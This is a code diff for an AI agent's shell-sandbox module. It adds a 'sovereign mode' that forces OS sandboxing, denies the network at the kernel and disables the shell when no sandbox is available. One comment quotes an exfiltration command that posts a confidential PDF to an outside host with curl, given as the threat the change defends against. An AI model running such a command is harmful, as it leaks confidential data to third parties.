@@ -1,4 +1,5 @@
 import { execFileSync } from 'child_process';
+import { isSovereign } from '../security/sovereign';
 
 // B3 — optional OS isolation for BashTool. We wrap commands in the platform's OS sandbox with a
 // profile that allows reads/exec/network but restricts file WRITES to the workspace + temp dirs —
@@ -11,7 +12,17 @@ import { execFileSync } from 'child_process';
 
 let enabled = false;
 export function setSandboxEnabled(v: boolean): void { enabled = v; }
-export function isSandboxEnabled(): boolean { return enabled; }
+
+/**
+ * Is the sandbox active for this call?
+ *
+ * Sovereign mode forces it on and cannot be toggled off, because the in-process egress perimeter
+ * (`security/egress.perimeter.ts`) governs THIS process and a subprocess has its own network stack.
+ * `curl -X POST https://elsewhere -d @confidential.pdf` is invisible to the perimeter, so the only
+ * thing standing between the model and that command is the kernel's network namespace. A sovereign
+ * claim with the sandbox switched off is not a sovereign claim.
+ */
+export function isSandboxEnabled(): boolean { return enabled || isSovereign(); }
 
 let availableCache: boolean | null = null;
 /** The usable OS sandbox backend for this platform, or null. Cached after the first real probe. */
@@ -84,16 +95,59 @@ export function buildProfile(cwd: string): string {
 }
 
 /**
+ * Seatbelt profile with the network denied as well — the sovereign-mode form of {@link buildProfile}.
+ * Identical to the floor profile's network stance, but scoped to the session's cwd rather than an
+ * episode worktree, so an ordinary interactive session keeps its normal write surface.
+ */
+export function buildOfflineProfile(cwd: string): string {
+  return [
+    '(version 1)',
+    '(allow default)',
+    '(deny network*)',
+    '(deny file-write*)',
+    '(allow file-write*',
+    `  (subpath ${JSON.stringify(cwd)})`,
+    '  (subpath "/private/tmp")',
+    '  (subpath "/private/var/folders")',
+    '  (subpath "/tmp")',
+    '  (literal "/dev/null") (literal "/dev/stdout") (literal "/dev/stderr") (literal "/dev/tty"))',
+  ].join('\n');
+}
+
+/**
  * If sandboxing is enabled and available, return the argv (excluding the binary — use sandboxBin())
  * to run `command` sandboxed via execFile, so no shell-quoting hazard. Returns null when sandboxing
  * does not apply, signalling the caller to run the command normally.
  */
 export function sandboxArgv(command: string, cwd: string): string[] | null {
-  if (!enabled) return null;
+  if (!isSandboxEnabled()) return null;
   const backend = sandboxBackend();
-  if (backend === 'seatbelt') return ['-p', buildProfile(cwd), '/bin/sh', '-c', command];
-  if (backend === 'bwrap') return [...buildBwrapArgv(cwd, false), command];
+  // Sovereign mode denies the network at the kernel. The ordinary profile deliberately permits it —
+  // an npm install or a git fetch is normal work — but under sovereign mode that permission is the
+  // one hole the in-process perimeter cannot see through.
+  const denyNetwork = isSovereign();
+  if (backend === 'seatbelt') {
+    return ['-p', denyNetwork ? buildOfflineProfile(cwd) : buildProfile(cwd), '/bin/sh', '-c', command];
+  }
+  if (backend === 'bwrap') return [...buildBwrapArgv(cwd, denyNetwork), command];
   return null;
+}
+
+/**
+ * Why the sovereign shell must refuse rather than degrade.
+ *
+ * Where no OS sandbox backend exists (Windows, or a macOS box without `sandbox-exec`), the ordinary
+ * path runs the command unsandboxed with a warning. Under sovereign mode that is the wrong trade:
+ * an unenforced shell is exactly the unproven assumption the mode exists to remove, and a warning
+ * an operator may not read is not a control. Returns the refusal text, or null when the shell may run.
+ */
+export function sovereignShellBlockedReason(): string | null {
+  if (!isSovereign()) return null;
+  if (sandboxAvailable()) return null;
+  return 'Sovereign mode is on, but this platform has no OS sandbox backend (need sandbox-exec on ' +
+    'macOS or bwrap on Linux), so a shell command cannot be denied the network at the kernel. ' +
+    'A subprocess is outside the in-process egress perimeter, so BashTool is disabled rather than ' +
+    'run with unproven isolation. Turn sovereign mode off to run shell commands on this machine.';
 }
 
 // ---------------------------------------------------------------------------
